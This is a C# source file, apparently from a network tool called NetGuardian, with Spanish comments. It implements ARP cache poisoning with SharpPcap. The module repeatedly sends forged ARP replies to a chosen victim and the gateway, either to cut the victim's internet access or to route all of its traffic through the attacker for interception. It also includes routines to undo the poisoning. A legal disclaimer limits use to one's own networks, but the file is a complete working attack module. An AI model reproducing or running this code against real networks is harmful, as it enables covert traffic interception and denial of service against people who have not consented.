using System.Net;
using System.Net.NetworkInformation;
using NetGuardian.Models;
using PacketDotNet;
using SharpPcap;

//
//  AVISO LEGAL / ETICO:
//  Este modulo implementa ARP spoofing (ARP cache poisoning). Usarlo en una
//  red que no sea propia o sin autorizacion expresa es ILEGAL en la mayoria
//  de jurisdicciones. Se incluye unicamente con fines educativos y de
//  administracion de redes propias. Uselo con responsabilidad.
//

namespace NetGuardian.Modules;

/// <summary>
/// Manipula las tablas ARP de la victima y del gateway.
///
/// Dos modos:
/// - BLOQUEO: le decimos a la victima que el gateway esta en NUESTRA MAC.
///   Su trafico hacia internet llega a nuestra maquina (donde se cuenta y
///   se descarta, asi que no tiene internet, pero podemos medir su subida).
/// - VIGILANCIA (MITM bidireccional): ademas le decimos al gateway que la
///   victima esta en nuestra MAC. Si se reenvian los paquetes (lo hace
///   TrafficMonitor), la victima tiene internet normal y medimos TODO su
///   trafico (subida y bajada), que es lo que necesita el monitor.
///   Solo debe activarse para el dispositivo que se quiere vigilar.
/// </summary>
public class ArpSpoofer : IDisposable
{
    private readonly ILiveDevice _device;
    private readonly PhysicalAddress _localMac;
    private readonly IPAddress _gatewayIp;
    private readonly PhysicalAddress _gatewayMac;
    private readonly CancellationTokenSource _cts = new();

    // Clave = IP de la victima
    private readonly Dictionary<string, (NetworkDevice target, bool watch)> _active = new();

    // SharpPcap ILiveDevice no expone siempre "Opened"; lo controlamos aqui.
    private bool _opened;

    public ArpSpoofer(ILiveDevice device, PhysicalAddress localMac,
        IPAddress gatewayIp, PhysicalAddress gatewayMac)
    {
        _device = device;
        _localMac = localMac;
        _gatewayIp = gatewayIp;
        _gatewayMac = gatewayMac;

        try { _device.Open(DeviceModes.Promiscuous | DeviceModes.NoCaptureLocal, 1000); _opened = true; }
        catch { /* ya estaba abierto por el monitor */ }

        // Un unico bucle de envenenamiento para todos los objetivos
        Task.Run(PoisonLoopAsync);
    }

    /// <summary>
    /// Bucle central: cada 500 ms re-envia los ARP falsos, porque los SO
    /// renuevan su cache ARP constantemente.
    /// </summary>
    private async Task PoisonLoopAsync()
    {
        while (!_cts.IsCancellationRequested)
        {
            List<(NetworkDevice t, bool watch)> snapshot;
            lock (_active) snapshot = _active.Values.ToList();

            foreach (var (target, watch) in snapshot)
            {
                try
                {
                    // Victima: "el gateway esta en NUESTRA MAC"
                    Send(BuildArpReply(
                        srcMac: _localMac, srcIp: _gatewayIp,
                        dstMac: target.Mac, dstIp: target.Ip));

                    if (watch)
                    {
                        // Gateway: "la IP de la victima esta en NUESTRA MAC"
                        Send(BuildArpReply(
                            srcMac: _localMac, srcIp: target.Ip,
                            dstMac: _gatewayMac, dstIp: _gatewayIp));
                    }
                }
                catch { }
            }
            await Task.Delay(500);
        }
    }

    private void Send(Packet p)
    {
        try { if (_opened) _device.SendPacket(p); } catch { }
    }

    // ---- API publica ----

    /// <summary>Bloquea internet de la victima (su trafico llega a nosotros y se descarta).</summary>
    public void BlockDevice(NetworkDevice target)
    {
        lock (_active) _active[target.Ip.ToString()] = (target, watch: false);
        target.IsBlocked = true;
    }

    /// <summary>
    /// Modo vigilancia: trafico bidireccional de la victima pasa por nosotros
    /// (requiere que TrafficMonitor este reenviando paquetes).
    /// </summary>
    public void WatchDevice(NetworkDevice target)
    {
        lock (_active) _active[target.Ip.ToString()] = (target, watch: true);
        target.IsBlocked = target.IsBlocked; // sin cambios
    }

    public void UnwatchDevice(NetworkDevice target)
    {
        // Si esta bloqueado, dejamos el envenenamiento simple; si no, curamos ARP
        if (target.IsBlocked)
        {
            BlockDevice(target);
        }
        else
        {
            lock (_active) _active.Remove(target.Ip.ToString());
            Heal(target);
        }
    }

    /// <summary>Restaura la tabla ARP de la victima (y del gateway si estaba vigilado).</summary>
    public void UnblockDevice(NetworkDevice target)
    {
        bool wasWatching;
        lock (_active)
        {
            wasWatching = _active.TryGetValue(target.Ip.ToString(), out var e) && e.watch;
            _active.Remove(target.Ip.ToString());
        }
        target.IsBlocked = false;
        if (wasWatching) HealGateway(target);
        Heal(target);
    }

    public bool IsWatching(NetworkDevice target) =>
        _active.TryGetValue(target.Ip.ToString(), out var e) && e.watch;

    /// <summary>Envia respuestas ARP con la MAC REAL del gateway a la victima.</summary>
    private void Heal(NetworkDevice target)
    {
        var heal = BuildArpReply(
            srcMac: _gatewayMac, srcIp: _gatewayIp,
            dstMac: target.Mac, dstIp: target.Ip);
        for (int i = 0; i < 5; i++) { Send(heal); Thread.Sleep(150); }
    }

    /// <summary>Restaura en el gateway la asociacion IP-victima -> MAC-victima.</summary>
    private void HealGateway(NetworkDevice target)
    {
        var heal = BuildArpReply(
            srcMac: target.Mac, srcIp: target.Ip,
            dstMac: _gatewayMac, dstIp: _gatewayIp);
        for (int i = 0; i < 5; i++) { Send(heal); Thread.Sleep(150); }
    }

    /// <summary>Construye un paquete Ethernet + ARP reply (opcode 2).</summary>
    private Packet BuildArpReply(PhysicalAddress srcMac, IPAddress srcIp,
        PhysicalAddress dstMac, IPAddress dstIp)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            targetHardwareAddress: dstMac,
            targetProtocolAddress: dstIp,
            senderHardwareAddress: srcMac,
            senderProtocolAddress: srcIp);

        // La cabecera Ethernet usa nuestra MAC real para que el paquete se
        // entregue; la suplantacion vive en senderHardwareAddress del ARP.
        var eth = new EthernetPacket(_localMac, dstMac, EthernetType.Arp);
        eth.PayloadPacket = arp;
        return eth;
    }

    public void Dispose() => _cts.Cancel();
}
